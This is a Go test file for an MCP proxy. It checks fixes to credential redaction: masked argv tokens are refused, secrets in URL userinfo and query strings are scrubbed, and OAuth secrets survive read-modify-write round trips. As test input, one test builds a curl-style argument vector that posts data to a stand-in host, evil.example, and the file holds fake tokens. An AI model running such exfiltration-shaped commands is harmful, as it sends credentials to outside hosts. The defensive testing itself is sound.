package server

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/smart-mcp-proxy/mcpproxy-go/internal/auth"
	"github.com/smart-mcp-proxy/mcpproxy-go/internal/config"
	"github.com/smart-mcp-proxy/mcpproxy-go/internal/oauth"
)

// This file collects the round-2 review findings on issue #1148. Each test
// names the defect it reproduces; all of them fail on the unfixed tree.

// ---------------------------------------------------------------------------
// Finding 1 (rounds 2 AND 3): the write path used to REVERT a masked argv
// token from the stored vector — first by value, then bound to the index plus
// the preceding flag. Both let a caller relocate a stored credential into a
// command line of their choosing, because an argv slot has no key to bind to
// and the caller supplies the whole vector *and* `command`.
//
// The revert is gone: an echoed mask is refused and the caller resends the real
// value. These tests pin BOTH halves of that contract — no vector containing a
// mask is ever accepted, and a vector with no mask is untouched.
// ---------------------------------------------------------------------------

func TestArgvMaskEcho_IsAlwaysRefused_NeverReverted(t *testing.T) {
	flagBound := []string{"mcp-foo", "--api-key", "hunter2-corp-token-9f3a"}
	// Round 3: masked by the VALUE-SHAPED detector, so the round-2 fix (which
	// only bound flag-paired masks) reverted it into any argv the caller liked.
	detectorShaped := []string{"mcp-foo", "run", "ghp_16Cabcdefghijklmnopqrstuvwxyz0123456789"}
	// A mask at index 0 is bound to nothing at all by an index+flag rule.
	leadingSecret := []string{"ghp_16Cabcdefghijklmnopqrstuvwxyz0123456789", "run"}

	for _, stored := range [][]string{flagBound, detectorShaped, leadingSecret} {
		masked := redactedArgs(stored, liveRedaction)
		secret, maskIdx := "", -1
		for i := range stored {
			if masked[i] != stored[i] {
				secret, maskIdx = stored[i], i
				break
			}
		}
		require.NotEqual(t, -1, maskIdx, "precondition: the read path masks the credential")

		// The mask, moved to EVERY position, inside argv vectors of every
		// shape — including the one it was masked at, and including one whose
		// neighbours are copied verbatim from the stored vector.
		var vectors [][]string
		for i := 0; i <= len(stored)+1; i++ {
			exfil := []string{"--silent", "--data", "https://evil.example/x", "-H", "-X", "POST"}
			vec := make([]string, 0, len(exfil)+1)
			vec = append(vec, exfil[:min(i, len(exfil))]...)
			vec = append(vec, masked[maskIdx])
			vec = append(vec, exfil[min(i, len(exfil)):]...)
			vectors = append(vectors, vec)
		}
		neighbourCopy := append([]string(nil), stored...)
		neighbourCopy[maskIdx] = masked[maskIdx]
		vectors = append(vectors, neighbourCopy, masked, []string{masked[maskIdx]})

		for _, incoming := range vectors {
			err := checkArgvMaskEcho(incoming, stored)
			require.Error(t, err, "a mask must be refused wherever it sits: %v", incoming)
			assert.NotContains(t, err.Error(), secret, "the refusal must not quote the secret")
			assert.Contains(t, err.Error(), "args_json", "the caller must be told which parameter to resend")
		}
	}
}

func TestArgvMaskEcho_AcceptsRealValues(t *testing.T) {
	stored := []string{"mcp-foo", "--api-key", "hunter2-corp-token-9f3a", "--port", "8080"}

	t.Run("an unchanged real vector is accepted", func(t *testing.T) {
		assert.NoError(t, checkArgvMaskEcho(append([]string(nil), stored...), stored))
	})

	t.Run("a rotated credential is accepted", func(t *testing.T) {
		assert.NoError(t, checkArgvMaskEcho(
			[]string{"mcp-foo", "--api-key", "brand-new-secret", "--port", "9090"}, stored))
	})

	t.Run("nil, empty and no stored vector are accepted", func(t *testing.T) {
		assert.NoError(t, checkArgvMaskEcho(nil, stored))
		assert.NoError(t, checkArgvMaskEcho([]string{}, stored))
		assert.NoError(t, checkArgvMaskEcho([]string{"mcp-foo"}, nil))
	})

	t.Run("a stale mask is refused even when the stored vector has moved on", func(t *testing.T) {
		// The byte-for-byte comparison against the CURRENT stored vector cannot
		// match here; the marker check is what keeps the mask out of the config.
		stale := redactedArgs(stored, liveRedaction)[2]
		assert.Error(t, checkArgvMaskEcho([]string{"mcp-foo", "--api-key", stale},
			[]string{"mcp-foo", "--api-key", "a-completely-different-token"}))
	})
}

// TestArgvMaskMarkers_MatchTheRenderings pins oauth.MaskMarkers to the functions
// that actually produce masks, so a change to either rendering fails here
// instead of silently letting a mask through the echo check.
func TestArgvMaskMarkers_MatchTheRenderings(t *testing.T) {
	for _, rendered := range []string{
		oauth.MaskValue("hunter2-corp-token-9f3a"),
		oauth.AuditMaskValue("hunter2-corp-token-9f3a"),
		maskDetectedSecrets("ghp_16Cabcdefghijklmnopqrstuvwxyz0123456789"),
	} {
		assert.True(t, containsArgvMaskMarker(rendered),
			"%q carries no marker the echo check recognises", rendered)
	}
	assert.False(t, containsArgvMaskMarker("mcp-foo"))
	assert.False(t, containsArgvMaskMarker("--api-key"))
}

// ---------------------------------------------------------------------------
// Finding 2: inspect_quarantined — the sibling operation of list_quarantined —
// still rendered raw connection errors and the raw GetConnectionStatus() map
// (last_error included) into its response.
// ---------------------------------------------------------------------------

func TestInspectQuarantined_ScrubsConnectionDiagnostics(t *testing.T) {
	secret := "urlsecret999"
	status := map[string]interface{}{
		"state":      "error",
		"connected":  false,
		"last_error": "dial https://host/mcp?token=" + secret + ": connection refused",
	}
	connErr := errors.New("read tcp: upstream https://host/mcp?token=" + secret + " reset by peer")

	timeoutMsg := inspectConnectionTimeoutError("evil", 20*time.Second, status)
	assert.NotContains(t, timeoutMsg, secret, "the timeout diagnostic republishes the raw connection status")
	assert.Contains(t, timeoutMsg, "evil")

	analysis := inspectConnectionFailedAnalysis("evil", status, connErr)
	encoded, err := json.Marshal(analysis)
	require.NoError(t, err)
	assert.NotContains(t, string(encoded), secret, "connection_info / error_details republish the raw error")
	assert.Contains(t, string(encoded), "QUARANTINED_CONNECTION_FAILED")

	// The caller's own status map must not be mutated in place.
	assert.Contains(t, status["last_error"], secret)
}

// ---------------------------------------------------------------------------
// Finding 3: scrubUpstreamText hard-coded the 512-byte AUDIT cap, so it
// silently truncated LIVE tool output — every tail_log line and every
// connection error.
// ---------------------------------------------------------------------------

func TestScrubUpstreamText_LiveReadsAreNotTruncated(t *testing.T) {
	long := "connect failed: " + strings.Repeat("x", 4096)

	live := scrubUpstreamText(long)
	assert.Equal(t, len(long), len(live), "tail_log is the primary debugging surface; long lines must survive")

	audit := scrubUpstreamTextForAudit(long)
	assert.Less(t, len(audit), len(long), "the activity store keeps its size cap")
	assert.True(t, strings.HasSuffix(audit, activityErrorMessageEllipsis))
}

// ---------------------------------------------------------------------------
// Finding 4: scrubUpstreamText did not remove URL userinfo credentials, so
// basic-auth passwords reached tail_log lines and connection errors.
// ---------------------------------------------------------------------------

func TestScrubUpstreamText_MasksURLUserinfo(t *testing.T) {
	got := scrubUpstreamText("dial https://alice:hunter2phrase@api.example.com/mcp: connection refused")
	assert.NotContains(t, got, "hunter2phrase")
	assert.Contains(t, got, "api.example.com", "the host must stay readable")
	assert.Contains(t, got, "connection refused")

	// Fixed in oauth.RedactSensitiveData, so the REST last_error / health.detail
	// scrubbers inherit it too.
	assert.NotContains(t, oauth.RedactSensitiveData("https://svc:s3cr3tvalue@host/x"), "s3cr3tvalue")
}

// ---------------------------------------------------------------------------
// Finding 5: redactArgvWith emitted URL-shaped argv tokens verbatim in the
// space-separated `--flag <url>` spelling and as a bare positional, on BOTH
// policies — while the inline `--flag=<url>` spelling was masked.
// ---------------------------------------------------------------------------

func TestRedactArgv_MasksURLCredentialsInEverySpelling(t *testing.T) {
	for _, policy := range []struct {
		name string
		r    redactionPolicy
	}{{"live", liveRedaction}, {"audit", auditRedaction}} {
		t.Run(policy.name, func(t *testing.T) {
			cases := map[string][]string{
				"userinfo, space-separated": {"--endpoint", "https://alice:hunter2phrase@api.example.com/mcp"},
				"userinfo, bare positional": {"https://alice:hunter2phrase@api.example.com/mcp"},
				"userinfo, inline":          {"--endpoint=https://alice:hunter2phrase@api.example.com/mcp"},
				"query, space-separated":    {"--endpoint", "https://api.example.com/mcp?token=SUPERSECRETTOKEN123"},
				"query, bare positional":    {"https://api.example.com/mcp?token=SUPERSECRETTOKEN123"},
				"query, inline":             {"--endpoint=https://api.example.com/mcp?token=SUPERSECRETTOKEN123"},
			}
			for name, argv := range cases {
				got := strings.Join(redactedArgs(argv, policy.r), " ")
				assert.NotContains(t, got, "hunter2phrase", "%s leaks the userinfo password", name)
				assert.NotContains(t, got, "SUPERSECRETTOKEN123", "%s leaks the query credential", name)
				assert.Contains(t, got, "api.example.com", "%s: the host is the audit signal", name)
			}
		})
	}

	// Ordinary arguments still round-trip verbatim.
	assert.Equal(t, []string{"mcp-foo", "--port", "8080", "https://api.example.com/mcp"},
		redactedArgs([]string{"mcp-foo", "--port", "8080", "https://api.example.com/mcp"}, liveRedaction))
}

// ---------------------------------------------------------------------------
// Finding 6: oauth.client_secret is masked on the MCP read surface
// (list_quarantined) but the MCP write path had no matching unmask, so an
// MCP-read → MCP-patch round trip persisted the MASK over the real credential.
// ---------------------------------------------------------------------------

func TestUnmaskLiveLeaves_ProtectAReadModifyWriteRoundTrip(t *testing.T) {
	stored := &config.ServerConfig{
		Name:    "srv",
		URL:     "https://host/mcp?token=urlsecret999",
		Env:     map[string]string{"BENIGN_NAME": "ghp_abcdefghijklmnopqrstuvwxyz0123456789"},
		Headers: map[string]string{"X-Zyx": "ghp_zyxwvutsrqponmlkjihgfedcba9876543210"},
		OAuth:   &config.OAuthConfig{ClientID: "cid", ClientSecret: "oauth-secret-4242"},
	}
	view := redactedServerView(stored, liveRedaction)

	t.Run("client_secret", func(t *testing.T) {
		oauthView, ok := view["oauth"].(map[string]interface{})
		require.True(t, ok)
		masked, ok := oauthView["client_secret"].(string)
		require.True(t, ok)
		require.NotEqual(t, stored.OAuth.ClientSecret, masked, "precondition: the read path masks it")

		echoed := &config.OAuthConfig{ClientID: "cid", ClientSecret: masked}
		unmaskLiveOAuth(echoed, stored.OAuth)
		assert.Equal(t, stored.OAuth.ClientSecret, echoed.ClientSecret,
			"an unedited echo must not persist the mask over the real client secret")

		edited := &config.OAuthConfig{ClientID: "cid", ClientSecret: "brand-new"}
		unmaskLiveOAuth(edited, stored.OAuth)
		assert.Equal(t, "brand-new", edited.ClientSecret)
	})

	t.Run("env and headers rendered by the live view", func(t *testing.T) {
		envView, ok := view["env"].(map[string]interface{})
		require.True(t, ok)
		maskedEnv, _ := envView["BENIGN_NAME"].(string)
		require.NotEqual(t, stored.Env["BENIGN_NAME"], maskedEnv)

		got := unmaskLiveEnvValues(map[string]string{"BENIGN_NAME": maskedEnv}, stored.Env)
		assert.Equal(t, stored.Env["BENIGN_NAME"], got["BENIGN_NAME"])

		hdrView, ok := view["headers"].(map[string]interface{})
		require.True(t, ok)
		maskedHdr, _ := hdrView["X-Zyx"].(string)
		gotH := unmaskLiveHeaders(map[string]string{"X-Zyx": maskedHdr}, stored.Headers)
		assert.Equal(t, stored.Headers["X-Zyx"], gotH["X-Zyx"])
	})

	t.Run("url", func(t *testing.T) {
		got, err := unmaskLiveURL(viewString(view, "url", ""), stored.URL)
		require.NoError(t, err)
		assert.Equal(t, stored.URL, got)
	})
}

// ---------------------------------------------------------------------------
// Finding 7: with detectContractedLeaves off, the LIVE surface — the one an
// unauthenticated /mcp caller reads — returned vendor-shaped credentials in the
// clear whenever they sat under a benign env/header name, while the AUDIT
// policy masked them.
// ---------------------------------------------------------------------------

func TestLiveRedaction_MasksVendorShapedSecretsUnderBenignNames(t *testing.T) {
	ghp := "ghp_abcdefghijklmnopqrstuvwxyz0123456789"

	assert.NotContains(t, redactEnvValueWith("BENIGN_NAME", ghp, liveRedaction), ghp)
	assert.NotContains(t, redactHeaderValueWith("X-Zyx", ghp, liveRedaction), ghp)

	// The #872 component-wise connection-string rendering is NOT collapsed:
	// the name/URL rules already rewrote it, so the detector stays out of it and
	// scheme/host/db remain readable for the operator's edit flow.
	conn := redactEnvValueWith("DATABASE_URL_PLAIN", "postgres://u:sup3rp4ss@db.example.com/appdb", liveRedaction)
	assert.NotContains(t, conn, "sup3rp4ss")
	assert.Contains(t, conn, "db.example.com")
	assert.Contains(t, conn, "appdb")

	// Ordinary configuration stays readable.
	assert.Equal(t, "debug", redactEnvValueWith("LOG_LEVEL", "debug", liveRedaction))
}

// ---------------------------------------------------------------------------
// Finding 9: installing an admin AuthContext on the stdio transport changes two
// nil-sensitive paths that the original behaviour list did not name. Both are
// intended — stdio now behaves like the API-key admin it is — and both are
// pinned here so a future change to either is a deliberate one. The full
// enumeration lives on stdioAuthContext in server.go.
// ---------------------------------------------------------------------------

func TestStdioAdminContext_NilSensitivePaths(t *testing.T) {
	stdioCtx := stdioAuthContext(context.Background())

	t.Run("session principal names the local admin", func(t *testing.T) {
		assert.Equal(t, "", principalFromContext(context.Background()))
		assert.Equal(t, auth.AuthTypeAdmin, principalFromContext(stdioCtx))
	})

	t.Run("preflight scope is materialised and allows every server", func(t *testing.T) {
		p := createTestMCPProxyServer(t)
		require.NoError(t, p.storage.SaveUpstreamServer(&config.ServerConfig{Name: "alpha", Enabled: true}))
		require.NoError(t, p.storage.SaveUpstreamServer(&config.ServerConfig{Name: "beta", Enabled: true}))

		none, err := p.sessionPreflightScope(context.Background())
		require.NoError(t, err)
		assert.Nil(t, none, "no identity and no profile stays unrestricted")

		scope, err := p.sessionPreflightScope(stdioCtx)
		require.NoError(t, err)
		require.NotNil(t, scope)
		assert.True(t, scope.Allows("alpha"))
		assert.True(t, scope.Allows("beta"))
	})
}
